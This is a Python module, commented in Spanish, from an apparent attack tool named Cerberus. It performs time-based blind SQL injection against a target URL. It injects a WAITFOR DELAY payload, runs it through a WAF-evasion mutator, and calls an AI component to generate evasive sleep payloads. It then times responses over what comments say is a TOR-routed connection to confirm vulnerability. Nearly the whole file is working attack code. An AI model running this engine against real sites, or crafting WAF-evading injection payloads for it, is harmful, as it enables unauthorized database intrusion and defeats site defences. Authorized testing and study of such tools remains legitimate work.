import logging
import time
from typing import Dict, Any
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_time")

class VectorTime(BaseVector):
    """
    Motor nativo asíncrono para inyección ciega basada en Tiempo (Time-Based Blind).
    Inyecta retardos condicionales y evalúa matemáticamente el TTR (Time to Response).
    """
    
    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Time-based sobre {self.target_url}")
        
        # Instanciar el evasor
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        delay_seconds = 5
        base_time = " WAITFOR DELAY '0:0:5'"
        
        # Integrate AI Smart Payloads if omni context allows
        if context.get("force_ai_payloads", True):
            try:
                from backend.core.cortex_ai import generate_smart_payloads
                logger.debug(f"[Time] Invocando Cortex AI (WAF: {context.get('waf_type', 'Auto')}) para generar paquete de ataques de latencia avanzados...")
                ai_ctx = {
                    "vector": "Time", 
                    "url": self.target_url, 
                    "parameter": "id",
                    "waf_type": context.get("waf_type", "general_strong")
                }
                # Request 1 time-delay payload with 5 seconds
                smart_p = await generate_smart_payloads(ai_ctx, "Generar inyecciones Time-based (Múltiples motores: sleep, pg_sleep, waitfor) con latencia de 5s, evadiendo WAF.", target_count=1)
                if smart_p and len(smart_p) >= 1:
                    base_time = smart_p[0]
                    logger.info(f"[*] Native Engine (AI): Paquete de latencia aplicado. Payload={base_time[:25]}...")
            except Exception as e:
                logger.warning(f"[Time] Paquete de ataques IA falló, usando heurística local. Error: {e}")

        # Payload base de tiempo (5 segundos) mutado dinámicamente
        payload_time = evader.evade(base_time)
        
        # 1. Medición de Latencia Base
        base_latencies = []
        for _ in range(3):
            t0 = time.time()
            resp = await self._safe_get(self.target_url)
            t1 = time.time()
            if resp:
                base_latencies.append(t1 - t0)
                
        if not base_latencies:
            return {"status": "failed", "reason": "baseline_unreachable"}
            
        avg_base = sum(base_latencies) / len(base_latencies)
        logger.debug(f"[Time] Baseline Latency Avg: {avg_base:.2f}s")
        
        # 2. Inyección de Retardo
        url_delay = self.inject_url(payload_time)
        t0 = time.time()
        resp_delay = await self._safe_get(url_delay)
        t1 = time.time()
        
        if not resp_delay:
            return {"status": "failed", "reason": "blocked_or_timeout"}
            
        delay_measured = t1 - t0
        logger.debug(f"[Time] Measured Latency w/ Payload: {delay_measured:.2f}s")
        
        # Matemáticas Heurísticas (Latencia Base + Delay Forzado - 1s de Gracia)
        # Ojo: La red TOR introduce jitter.
        if delay_measured >= (avg_base + delay_seconds - 1.0):
            logger.info(f"[+] Inyección Time-Based Exitosa (Matemática Pura): Retardo confirmable detectado ({delay_measured:.2f}s)")
            return {
                "status": "vulnerable",
                "technique": "Time-based blind",
                "evidence": f"Baseline {avg_base:.2f}s, Delay Payload: {delay_measured:.2f}s"
            }
            
        # ── Cortex AI: El Oráculo Temporal (Zona Gris de Jitter) ───────────
        # Si el delay no fue absoluto, pero hubo un spike sospechoso (ej. 2-3 segundos de más),
        # puede deberse al Jitter del proxy/TOR interrumpiendo un sleep exitoso parcialmente.
        if delay_measured >= (avg_base + (delay_seconds * 0.4)):
            logger.info(f"[?] Spike Temporal Intermedio (Jitter: {delay_measured:.2f}s). Invocando a Cortex AI...")
            from backend.core.cortex_ai import analyze_injection_response
            
            # Formateamos métricas como "cuerpos falsos" para que el Oráculo entienda el contexto
            base_stat = f"Baseline Avg: {avg_base:.2f}s - Array: {base_latencies}"
            true_stat = f"Measured True Delay (Requested {delay_seconds}s): {delay_measured:.2f}s"
            
            ai_verdict = await analyze_injection_response(
                baseline_content=base_stat,
                true_content=true_stat,
                false_content="Expected clean False delay: 0s",
                vector_type="Time-based blind (Jitter Analysis)"
            )
            
            logger.info(f"🧠 [Oráculo AI] Veredicto: {ai_verdict['status']}. Confianza: {ai_verdict['confidence']*100}%")
            
            if ai_verdict['status'] == 'vulnerable' and ai_verdict['confidence'] > 0.70:
                return {
                    "status": "vulnerable",
                    "technique": "Time-based blind (AI Jitter Analyzed)",
                    "evidence": ai_verdict['reasoning']
                }
        # ───────────────────────────────────────────────────────────────────
            
        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url)
        except Exception as e:
            logger.warning(f"Error HTTP en vector de tiempo: {e}")
            return None
